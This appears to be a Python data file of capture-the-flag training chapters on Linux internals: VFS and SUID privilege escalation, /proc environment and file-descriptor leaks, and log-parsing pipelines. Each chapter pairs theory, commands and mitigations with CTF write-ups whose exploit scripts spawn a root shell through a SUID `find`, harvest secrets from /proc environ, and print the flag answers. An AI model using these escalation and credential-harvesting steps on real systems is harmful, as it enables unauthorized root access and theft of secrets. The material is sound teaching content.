"""
CTF Atlas — Linux & Operating Systems Chapters
"""

chapters = {}

chapters["linux-vfs"] = {
    "id": "linux-vfs",
    "domain": "linux",
    "category": "Systems & Kernel Internals",
    "title": "POSIX Virtual Filesystem (VFS) Architecture & Inode Exploitation",
    "subtitle": "Virtual Filesystem Switch, Inode Allocation, Permission Octets & SUID Privilege Escalation",
    "diagram": """+-------------------------------------------------------------+
|                      User Space Process                     |
|  read(fd, buf, count)  --> System Call Interface (int 0x80) |
+------------------------------+------------------------------+
                               |
+------------------------------v------------------------------+
|            Linux Kernel Virtual Filesystem (VFS)            |
|  +------------------+  +------------------+  +-----------+  |
|  | file descriptor  |  | dentry (dcache)  |  | superblock|  |
|  | struct file      |->| filename -> inode|  | filesystem|  |
|  +------------------+  +--------+---------+  +-----------+  |
|                                 |                           |
|                        +--------v--------+                  |
|                        |  struct inode   |                  |
|                        |  - i_mode bits  | (04755 = SUID)   |
|                        |  - i_uid / i_gid|                  |
|                        |  - atime/mtime/ |                  |
|                        |  - i_block[15]  |                  |
|                        +--------+--------+                  |
+---------------------------------+---------------------------+
                                  |
            +---------------------+---------------------+
            v                     v                     v
      +-----------+         +-----------+         +-----------+
      | ext4/xfs  |         |   procfs  |         |   tmpfs   |
      | disk block|         | /proc/PID |         | shared mem|
      +-----------+         +-----------+         +-----------+""",
    "theory": """The Linux Virtual Filesystem Switch (VFS) provides a standardized kernel abstraction layer over disparate concrete storage engines (ext4, XFS, Btrfs, NFS) and synthetic pseudo-filesystems (procfs, sysfs, tmpfs). Every user-space filesystem call—such as open(), read(), write(), and stat()—is intercepted by the VFS dispatch table and routed to the corresponding operations table (struct inode_operations or struct file_operations) implemented by the active filesystem module.

The kernel filesystem representation relies on four primary core data structures:
1. Superblock Object (struct super_block): Stores global metadata for an entire mounted filesystem, including block size, allocation bitmaps, filesystem magic identifier (e.g. 0xEF53 for ext2/3/4), total and free inode counters, and mount flags (e.g. MS_NODEV, MS_NOSUID, MS_RDONLY). In privilege escalation attacks, identifying filesystems mounted WITHOUT the 'nosuid' option is essential for staging SUID binary payloads.
2. Inode Object (struct inode): Represents an abstract file or directory entity independent of human-readable directory tree paths. Each inode is indexed by a filesystem-unique 64-bit integer (inode number). Inodes store critical metadata: permission mode bits (16-bit field encoding file type and access permissions), owner UID, group GID, file byte size (i_size), hard link counter (i_nlink), block pointer map, and three POSIX timestamps (atime, mtime, ctime). Note that the filename is NOT stored inside the inode—it resides inside directory data blocks mapped by directory entries.
3. Directory Entry Object (struct dentry): Associates directory path components with corresponding inode numbers. The dentry cache (dcache) retains recent path lookup resolutions in kernel memory to minimize expensive physical disk accesses. Hard links are simply multiple dentry structures pointing to the exact same underlying inode number.
4. File Object (struct file): Represents an active open file descriptor held by a process in user space. It maintains runtime state including current seek offset (f_pos), access flags (O_RDONLY, O_WRONLY, O_CREAT), reference counts, and a pointer to the associated dentry.""",
    "commands": [
        {
            "cmd": "find / -perm -4000 -type f 2>/dev/null",
            "why": "Identifies all binaries across the system that execute with SetUID (effective UID of owner, typically root).",
            "when": "Immediate post-compromise reconnaissance after obtaining initial low-privilege shell.",
            "internals": "Queries inode i_mode bits checking bitwise mask S_ISUID (04000). Standard output errors (stderr) are redirected to /dev/null to suppress unreadable permission warnings.",
            "pitfalls": "Excludes SetGID (02000) binaries. Use -perm /6000 to search for SUID OR SGID binaries simultaneously."
        },
        {
            "cmd": "ls -lai /usr/bin/find /usr/local/bin/find",
            "why": "Displays inode numbers (-i), file ownership, permissions, and links to verify whether an executable has been tampered with or replaced.",
            "when": "Validating candidate binaries flagged during SUID enumeration.",
            "internals": "Invokes lstat() system call to read st_ino, st_mode, st_uid, and st_gid from the inode.",
            "pitfalls": "Be aware that relative path aliases or PATH environment hijacking can lead you to execute a different binary than intended."
        },
        {
            "cmd": "stat -c '%a %n %U (%u)' /etc/shadow",
            "why": "Displays numeric octal permissions, owner username, and numeric UID of sensitive configuration files.",
            "when": "Auditing target files for misconfigured write or read permissions.",
            "internals": "Directly decodes the 16-bit st_mode integer returned by stat64() syscall.",
            "pitfalls": "Filesystem ACLs (Access Control Lists) indicated by a '+' trailing symbol in ls -l may grant permissions not visible in octal representation."
        },
        {
            "cmd": "cat /proc/mounts | grep -v 'nosuid'",
            "why": "Discovers writable partitions where SUID execution is permitted by the kernel mount flags.",
            "when": "Planning where to compile and drop a SUID payload.",
            "internals": "Reads kernel struct vfsmount flags directly from the VFS mount namespace table.",
            "pitfalls": "/dev/shm and /tmp are frequently mounted with 'nosuid,noexec' on hardened production systems."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "Enumerate SUID: `find / -perm -4000 -type f 2>/dev/null | grep -v '/snap'` -> Cross reference results with GTFOBins -> Execute GTFOBins bypass recipe -> Verify UID: `id` -> Read flag.",
        "gui_workflow": "In desktop Linux/VMs: Open File Manager (Nautilus/Thunar) -> Properties -> Permissions tab -> Observe 'Execute as program' and special bits. However, CTF competitions strictly restrict access to headless SSH/reverse shells, making terminal mastery mandatory.",
        "speed_tip": "Run `find / -perm -4000 -type f -exec ls -ld {} + 2>/dev/null` to obtain a long listing of all SUID files in a single fast process batch instead of spawning ls per item."
    },
    "triage_workflow": [
        "1. Enumerate Current Context: Run `id`, `whoami`, `groups`, and inspect environment variables (`env`).",
        "2. Enumerate Special Executables: Run `find / -perm -4000 -type f 2>/dev/null` to locate SUID binaries.",
        "3. Cross-Reference GTFOBins: Check discovered binaries against the GTFOBins repository (e.g. find, cp, bash, python, vim, env, nmap).",
        "4. Audit PATH Hijacking: Inspect writable directories in $PATH: `echo $PATH` and `find / -writable -type d 2>/dev/null`.",
        "5. Execute Privilege Escalation: Invoke the GTFOBins vector (e.g. `find . -exec /bin/sh -p \\; -quit`).",
        "6. Validate Root Context & Extract Flag: Run `id` (must show euid=0), then `cat /root/flag.txt`."
    ],
    "writeup": {
        "ctf_event": "Collegiate Cyber Defense / HackTheBox Proving Grounds",
        "challenge_name": "Inception-SUID (Linux Privilege Escalation)",
        "scenario": "A target server exposes an SSH service with default student credentials (ctf:password). The goal is to escalate to root and recover /root/flag.txt.",
        "solve_steps": [
            "1. Connect via SSH: ssh ctf@target.lab",
            "2. Enumerate SUID binaries: find / -perm -4000 -type f 2>/dev/null",
            "3. Result reveals non-standard binary: /usr/local/bin/find owned by root with 4755 permissions (-rwsr-xr-x).",
            "4. Check GTFOBins recipe for find: The -exec option executes commands without dropping privileges if the shell is invoked with -p.",
            "5. Execute exploit: /usr/local/bin/find /root -name 'flag*' -exec cat {} \\;",
            "6. Alternatively, spawn interactive root shell: /usr/local/bin/find . -exec /bin/sh -p \\; -quit",
            "7. Read flag: cat /root/flag.txt -> CTF{SUID_GT_F0_Bins_R00t}"
        ],
        "exploit_code": """#!/usr/bin/env python3
import subprocess

def exploit_suid():
    cmd = "/usr/local/bin/find /root -name flag.txt -exec cat {} \\;"
    res = subprocess.check_output(cmd, shell=True, text=True)
    print("[+] Recovered Flag:", res.strip())

if __name__ == '__main__':
    exploit_suid()""",
        "flag": "CTF{SUID_GT_F0_Bins_R00t}",
        "mitigation": "Mount user-writable partitions (/tmp, /home) with the 'nosuid' mount option. Audit all custom binaries and remove the SUID bit using `chmod u-s /usr/local/bin/find` unless strictly necessary."
    }
}

chapters["linux-proc-ipc"] = {
    "id": "linux-proc-ipc",
    "domain": "linux",
    "category": "Systems & Kernel Internals",
    "title": "Linux Process Architecture, /proc Pseudo-FS & IPC Exploitation",
    "subtitle": "Task Structs, File Descriptor Manipulation, Memory Maps & Environment Variable Leaks",
    "diagram": """+-----------------------------------------------------------------+
|               Linux /proc/[PID]/ Kernel Subsystem               |
+-----------------------------------------------------------------+
/proc/[PID]/
  |-- cmdline      -> Null-delimited command arguments
  |-- environ      -> Environment variables (secret API keys, passwords)
  |-- cwd          -> Symlink to process current working directory
  |-- exe          -> Symlink to executing ELF binary (carve deleted bin)
  |-- fd/          -> Open file descriptors (0:stdin, 1:stdout, 2:stderr)
  |     |-- 3      -> Symlink to /root/flag.txt (opened by parent!)
  |     +-- 4      -> Unix Domain Socket to internal daemon
  |-- maps         -> Virtual memory addresses & ASLR base layout
  |-- mem          -> Raw process memory bytes (readable via ptrace)
  +-- status       -> Process capabilities, UID/GID, Seccomp filters""",
    "theory": """The Linux operating system represents processes via kernel `struct task_struct` instances. The `/proc` filesystem (procfs) is a synthetic pseudo-filesystem generated on-the-fly by the kernel to expose process internals, device drivers, and kernel parameters to user space without requiring dedicated system calls.

Process Inspection & Forensic Goldmines:
1. Environment Variable Recovery (`/proc/[PID]/environ`): When processes spawn (via `fork()` + `execve()`), they inherit or define environment variables. Developers frequently pass database credentials, private keys, and flag strings via environment variables (e.g. `FLAG=CTF{...}`). In CTF challenges featuring Local File Inclusion (LFI) or path traversal on Linux servers, reading `/proc/self/environ` or `/proc/1/environ` directly leaks these secrets.
2. File Descriptor Leaks (`/proc/[PID]/fd/`): If a privileged daemon opens a sensitive file (like `/root/flag.txt`) and subsequently executes an unprivileged child process or script without setting the `FD_CLOEXEC` (Close-on-Exec) flag, the open file descriptor remains inherited and active in the child. Even if permissions on the file forbid read access, the child can read the content directly via `/proc/self/fd/3`.
3. Executable Recovery (`/proc/[PID]/exe`): If an administrator or challenge creator deletes a running binary from disk (`rm /opt/vuln_server`), the inode is unlinked but its data blocks persist in memory as long as the process runs. Solvers can dump and reconstruct the exact deleted ELF binary by running `cp /proc/[PID]/exe ./recovered_binary`.
4. Memory Mapping Layout (`/proc/[PID]/maps`): Exposes the exact start and end virtual addresses, permission flags (rwxp), and mapped files (libc.so.6, ld.so, heap, stack). If PIE and ASLR are active, reading `/proc/self/maps` immediately bypasses ASLR by providing exact base addresses.""",
    "commands": [
        {
            "cmd": "tr '\\0' '\\n' < /proc/self/environ",
            "why": "Dumps all environment variables formatted with newlines instead of null bytes.",
            "when": "Immediately upon achieving remote command execution or LFI.",
            "internals": "Reads task_struct->mm->env_start through env_end.",
            "pitfalls": "Requires read permissions on the target PID's proc directory."
        },
        {
            "cmd": "ls -l /proc/*/fd/* 2>/dev/null | grep flag",
            "why": "Finds any active process that currently holds an open file descriptor pointing to a flag file.",
            "when": "Privilege escalation enumeration on multi-user or service-hosted CTF targets.",
            "internals": "Procfs fd directory contains symbolic links representing active struct file references.",
            "pitfalls": "Requires elevated privileges to read other users' fd directories on modern kernels with ptrace_scope enabled."
        },
        {
            "cmd": "cat /proc/sys/kernel/yama/ptrace_scope",
            "why": "Checks whether non-root processes can attach debuggers (gdb/strace) to sibling processes.",
            "when": "Assessing process memory injection or sniffing opportunities.",
            "internals": "0 = classic ptrace permissions; 1 = restricted to direct descendants; 2 = admin-only; 3 = disabled.",
            "pitfalls": "Values >= 1 prevent cross-process memory reading without root privileges."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: `ps aux | grep -i target` -> `cat /proc/<PID>/cmdline | tr '\\0' ' '` -> extract secrets in 2 seconds.",
        "gui_workflow": "HTop / GNOME System Monitor: Visual process tree view, CPU/RAM charts. Does not expose raw file descriptors or memory maps as cleanly as procfs.",
        "speed_tip": "Use `grep -s -r 'FLAG' /proc/[0-9]*/environ 2>/dev/null` to search all accessible process environments for flags in one shot."
    },
    "triage_workflow": [
        "1. Identify Current Process Context: `cat /proc/self/status`.",
        "2. Enumerate Running Daemons: `ps auxww` or `ls -d /proc/[0-9]*`.",
        "3. Audit Process Environments: Check `/proc/1/environ` (Docker/Init) and other user PIDs.",
        "4. Audit Inherited File Descriptors: Inspect `ls -la /proc/self/fd/`.",
        "5. Inspect Memory Layout: `cat /proc/self/maps` to discover loaded library paths.",
        "6. Intercept System Calls: If permitted, run `strace -p <PID>` to capture plaintext I/O."
    ],
    "writeup": {
        "ctf_event": "HackTheBox / OverTheWire",
        "challenge_name": "Ghost-In-Proc (Descriptor Leaks)",
        "scenario": "A setuid wrapper binary opens /root/flag.txt, drops privileges to 'ctf', and executes an interactive Python shell. The file /root/flag.txt is 0400 root:root.",
        "solve_steps": [
            "1. Spawned into Python shell as user 'ctf'.",
            "2. Attempting `open('/root/flag.txt').read()` fails with PermissionError.",
            "3. Check open file descriptors in current process: `import os; print(os.listdir('/proc/self/fd'))` -> reveals descriptors [0, 1, 2, 3].",
            "4. Check destination of fd 3: `os.readlink('/proc/self/fd/3')` -> returns `/root/flag.txt`!",
            "5. Read content from inherited descriptor: `os.read(3, 100).decode()`.",
            "6. Flag recovered: CTF{FD_CLOEXEC_FORGOTTEN_BY_DEV}"
        ],
        "exploit_code": """#!/usr/bin/env python3
import os

def solve():
    flag = os.read(3, 128).decode()
    print("[+] Flag from FD 3:", flag.strip())

if __name__ == '__main__':
    solve()""",
        "flag": "CTF{FD_CLOEXEC_FORGOTTEN_BY_DEV}",
        "mitigation": "Always set O_CLOEXEC or invoke fcntl(fd, F_SETFD, FD_CLOEXEC) on sensitive file descriptors before executing lower-privileged processes."
    }
}

chapters["linux-pipelines"] = {
    "id": "linux-pipelines",
    "domain": "linux",
    "category": "Shell & Automation",
    "title": "POSIX Shell Pipelines, Stream Redirection & Stream Parsers",
    "subtitle": "File Descriptors 0/1/2, Anonymous Pipes, Sed/Awk Byte Transformation & Forensic Grep",
    "diagram": """+-----------------------------------------------------------------+
|                  POSIX Shell Stream Processing                  |
+-----------------------------------------------------------------+
[ Producer ]               [ Filter ]                [ Reducer ]
cat access.log  ---|pipe|---> awk '{print $7}' --|pipe|-> sort | uniq -c
(stdout -> fd 1)          (stdin 0 -> stdout 1)      (Aggregates top hits)
      |
      +---> 2>/dev/null  (Redirects stderr / fd 2 to null device)
      +---> &> full.log   (Redirects both stdout & stderr to file)
      +---> 2>&1 | tee    (Merges error stream into stdout pipe)""",
    "theory": """The Unix philosophy emphasizes building modular utilities that perform a single function comprehensively, combined through standardized byte streams. The POSIX standard establishes three default file descriptors for every process: Standard Input (`stdin`, fd 0), Standard Output (`stdout`, fd 1), and Standard Error (`stderr`, fd 2).

Stream Redirection Mechanics:
- `>` and `>>`: Overwrite and append redirection of fd 1 to a concrete file.
- `2>`: Redirects fd 2 (errors) to suppress permission warnings or save crash dumps.
- `2>&1`: Duplicates file descriptor 2 to point to wherever fd 1 currently points. Order matters: `cmd > file 2>&1` directs both streams to `file`.
- `|` (Anonymous Pipe): The kernel creates a unidirectional memory buffer (typically 64KB) linking the stdout of the upstream process to the stdin of the downstream process. Both processes execute concurrently.

The Essential Forensic Stream Tooling:
1. `awk`: A pattern scanning and data processing language. Operates record-by-record (default newline) and field-by-field (default whitespace). `awk '{print $1, $4}'` extracts fields; `awk '$3 == 404 {count++} END {print count}'` computes metrics.
2. `sed`: Stream editor for filtering and transforming text using regular expressions. `sed -n 's/.*flag{\\(.*\\)}.*/\\1/p'` extracts captured patterns.
3. `xargs`: Converts standard input lines into CLI arguments for another executable. Critical when handling tens of thousands of files where shell globbing (`*`) hits `ARG_MAX` buffer limits.""",
    "commands": [
        {
            "cmd": "awk -F: '$3 == 0 {print $1}' /etc/passwd",
            "why": "Extracts all usernames with UID 0 (root privileges) using colon delimiter.",
            "when": "Auditing Linux users for rogue administrative accounts.",
            "internals": "Splits record buffer at ':' bytes and evaluates numeric equality on field 3.",
            "pitfalls": "Some systems use LDAP or NIS which do not appear in local /etc/passwd."
        },
        {
            "cmd": "grep -oE '[a-zA-Z0-9_]{32}' evidence.log | sort | uniq -c | sort -nr | head -10",
            "why": "Extracts 32-character MD5 hashes or tokens, deduplicates, and ranks by frequency.",
            "when": "Analyzing forensic server logs for credential dumping or brute-force attempts.",
            "internals": "Performs regex match compilation; pipe transfers buffers through memory pages.",
            "pitfalls": "Ensure PCRE or Extended regex (-E) is enabled when using quantifier braces."
        },
        {
            "cmd": "find . -type f -name '*.txt' -print0 | xargs -0 grep -l 'CTF{'",
            "why": "Safely searches for flag strings in filenames containing spaces, quotes, or newlines.",
            "when": "Scanning extracted archive trees with messy or malicious filenames.",
            "internals": "Uses null byte delimiter (\\0) instead of whitespace.",
            "pitfalls": "Omitting -0 when files have spaces causes xargs to split single filenames into multiple arguments."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "Grep/Awk/Sed pipelines process 1GB log files in under 2 seconds directly in RAM.",
        "gui_workflow": "Text editors (VS Code / Sublime) often freeze or crash when loading 500MB+ log dumps.",
        "speed_tip": "Set `LC_ALL=C` before running `grep` or `sort` across large files: `LC_ALL=C grep 'pattern' big.log` runs 5x-10x faster by bypassing UTF-8 validation."
    },
    "triage_workflow": [
        "1. Identify File Structure: Inspect first 5 lines with `head -n 5 log.txt`.",
        "2. Count Total Records: `wc -l log.txt` to assess dataset volume.",
        "3. Isolate Key Delimiters: Determine whether data is CSV, TSV, JSON, or whitespace.",
        "4. Filter Noise: Use `grep -v` to remove known normal traffic.",
        "5. Aggregate Anomalies: Pipe through `sort | uniq -c | sort -n`.",
        "6. Extract Target Tokens: Use `grep -oE 'CTF\\{[^\\}]+\\}'`."
    ],
    "writeup": {
        "ctf_event": "PicoCTF / Bandit",
        "challenge_name": "Log-Sifting (Million-Line Triage)",
        "scenario": "A web server log containing 2,000,000 requests is provided. One IP address made a single request containing the flag in its User-Agent string.",
        "solve_steps": [
            "1. Triage file size: 250 MB text log.",
            "2. Rank IP frequencies: `awk '{print $1}' access.log | sort | uniq -c | sort -n | head -5`.",
            "3. IP `198.51.100.42` appears exactly once.",
            "4. Extract log line for this IP: `grep '^198.51.100.42' access.log`.",
            "5. User-Agent contains base64 string: `VGFyZ2V0OiBDVEZ7UElQRUxJTkVfTUFTVEVSXzIwMjZ9`.",
            "6. Decode string: `echo '...' | base64 -d`.",
            "7. Flag: CTF{PIPELINE_MASTER_2026}"
        ],
        "exploit_code": """#!/usr/bin/env python3
import subprocess

def solve():
    cmd = "awk '{print $1}' access.log | sort | uniq -c | sort -n | head -1 | awk '{print $2}'"
    rare_ip = subprocess.check_output(cmd, shell=True, text=True).strip()
    line = subprocess.check_output(f"grep '^{rare_ip}' access.log", shell=True, text=True)
    print("[+] Unique Line:", line)

if __name__ == '__main__':
    solve()""",
        "flag": "CTF{PIPELINE_MASTER_2026}",
        "mitigation": "Ingest logs into structured SIEM platforms (Elasticsearch/Splunk) and alert on single-occurrence anomalies and high-entropy User-Agent strings."
    }
}
